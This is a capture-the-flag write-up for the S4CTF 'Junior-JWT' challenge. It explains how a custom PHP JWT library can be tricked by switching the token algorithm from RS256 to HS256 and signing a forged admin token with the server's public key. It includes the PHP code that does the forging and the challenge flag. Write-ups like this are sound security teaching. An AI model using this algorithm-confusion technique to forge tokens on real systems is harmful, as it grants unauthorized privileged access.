# Junior-JWT

## Description

Just one of [them](http://junior-jwt.peykar.io)!

## Files provided

A zip file containing a PHP page source code. (You can see extracted files in
[source](source/) folder in the repo)

## TL;DR

We should change the algorithm to `HS256` and change the role value in jwt to
`admin` and sign it with the given public key.

## Writeup

Looking at the source code, we see a class called `JWT` that provides `encode`
and `decode` methods and also some helper functions for URL decoding.

Also there is a `main` function that runs on startup. It creates `jwt` cookie
with `role: guest` if it's not present.  
if The cookie is present it checks the `role` attribute, if the role is equal
to `admin` it shows the flag, otherwise it shows the source code.

So we should find a way to modify role value to `admin` in the jwt cookie but
we don't have the jwt secret key. So we should go for potential bugs in the
jwt methods.

There can be several famous [bugs](https://auth0.com/blog/critical-
vulnerabilities-in-json-web-token-libraries/) in jwt custom libraries. The
first bug I tried was the `none algorithm`. But at line 40 the decode function
checks for the none algorithm, So this is not the solution.

As we see in `main` function, the jwt is signed with `RS256` algorithm by
default. RSA uses public and private key (Asymmetric). The JWT is signed using
private key and verified using public key. We can see the public key in the
source code but we need the private key for signing our modified jwt.

### The Idea

If we could find a way that server verifies the jwt using the same key that
jwt is signed with, we could easily change the role field and sign our jwt
using the public key.

In `HS256` algorithm, that is a symmetric algorithm, the jwt should be signed
and verified using the same secret key. So, if we change the jwt algorithm to
`HS256`, change the `role` value to `admin` and sign it with the public key,
the server will also verify the jwt using public key.

## Solution

For creating the payload, we can use the website's source code.

We should just change the main function as below (changing role to `admin` and
changing `RS256` to `HS256`):

```  
function main()  
{

   $publikKey  = '-----BEGIN PUBLIC KEY-----  
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApPRW0nXMoQyN8GzVCHaW  
nWyq00omHh/o7AXEJvbpVBk5HTWLt+Zdj1aK1JFWU5lPeMSoXkf7WJiqoGgwVblX  
Rq2dSIIaNBFSjomS1Mcw1Tyx+q9Y6CPJGdwAMEMH5uKhGkgV9OrFQcHoozLAvzFl  
BneqmTO9+V1FKEuHWHItvdP1em7UiUnZ7JXb13L4IbZVGPNgDVf0GoButIlVo1+T  
pMZcBHNV0ndGZg0e6qTCp5m9yMWcH697Rt2FRN4fgJpYBknBs8UrAeCczRkk6037  
N+c4IM+St6KZNqg+4ZlRZC+V9zOBSTkrXXN/CXRUiIQMgmyit5zbEpN8PUY6VPzk  
zVI9FbkB0nb+Dp04VPRWeeV1IKPZk2DuSOALh9ZacbEQ8Spuua6nxZ5gCSve7TL7  
r9xg8ml5zZXAw7l8WoHkyy2ocPy0OL+PWFvUar59epfPUQZmRE08yVrlvy+WXFC2  
dbFxD80tPgbcjJbKRGGv1uOx/3Z2HrXHoOslVmV87rgWfxBaJjrSsSY1fKLYJLnk  
FKJd6eSLDYzTAczbMiov8F9ovMw4/juWZy2s4QOCdXp7byKOuQUJ+HSiZiNiyjTk  
XaA5oGEF/FIxAMRbaEd/YSsE7ASMxS4mhyIAGFvqK8YZ+xqEAbNlT4zK+dAAC3mL  
I/VyHBAlgHRxEiRE860DhfcCAwEAAQ==  
-----END PUBLIC KEY-----';

   $issuedAt = new DateTimeImmutable();  
   $data = [  
       "role" => "admin",  
       "iat" => $issuedAt->getTimestamp(),  
       "nbf" => $issuedAt->getTimestamp()  
   ];

   $token = JWT::encode($data, $publikKey, 'HS256');

   echo $token;

}

```

It will print the the JWT payload that we should put in `jwt` cookie and
request `GET /` to get the flag.

## Flag

`S4CTF{7h3r3__iS_s733L_a_bUnch3__0u7_th3r3!!!}`  

Original writeup (https://github.com/ali-
em/writeups2021/tree/main/S4CTF/junior-jwt).